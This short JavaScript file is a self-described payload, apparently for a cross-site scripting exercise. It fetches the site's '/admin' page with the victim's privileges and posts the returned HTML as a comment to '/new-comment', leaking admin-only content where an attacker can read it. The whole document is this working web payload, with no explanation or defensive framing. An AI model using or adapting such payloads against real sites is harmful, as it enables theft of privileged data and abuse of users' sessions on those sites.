console.log('Payload running')
fetch('/admin').then((r) => r.text()).then((r) => {
  const data = new URLSearchParams()
  data.append('name', 'admin')
  data.append('comment', 'comment ' + r)
  fetch('/new-comment', {
    method: 'POST',
    body: data
  })
})
console.log('Payload finished')
